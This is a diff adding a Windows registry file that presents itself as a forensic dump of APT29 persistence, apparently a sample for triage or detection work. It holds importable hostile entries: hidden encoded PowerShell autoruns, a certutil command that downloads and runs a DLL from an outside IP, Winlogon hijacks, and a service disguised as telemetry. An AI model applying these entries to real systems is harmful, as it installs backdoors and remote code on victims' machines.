@@ -1,0 +1,23 @@
+Windows Registry Editor Version 5.00
+
+; =========================================================
+; FORENSIC TRIAGE REGISTRY HIVE DUMP - APT29 PERSISTENCE
+; =========================================================
+
+[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]
+"SecurityHealth"="C:\\Windows\\system32\\SecurityHealthSystray.exe"
+"WindowsDefenderUpdater"="C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\UpdateCheck.exe --beacon"
+"SvchostBackdoor"="powershell.exe -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtAA=="
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce]
+"Stage2Installer"="cmd.exe /c certutil.exe -urlcache -split -f http://193.106.191.24/stage2.dll C:\\Windows\\Temp\\stage2.dll & rundll32.exe C:\\Windows\\Temp\\stage2.dll,Start"
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]
+"Shell"="explorer.exe, C:\\ProgramData\\backdoor_shell.exe"
+"Userinit"="C:\\Windows\\system32\\userinit.exe, C:\\Windows\\System32\\mimikatz_helper.dll"
+
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EvilService]
+"DisplayName"="Windows Telemetry Reporting Agent"
+"ImagePath"="C:\\Windows\\System32\\svchost_malicious.exe -k netsvcs"
+"Start"=dword:00000002
+"Type"=dword:00000010
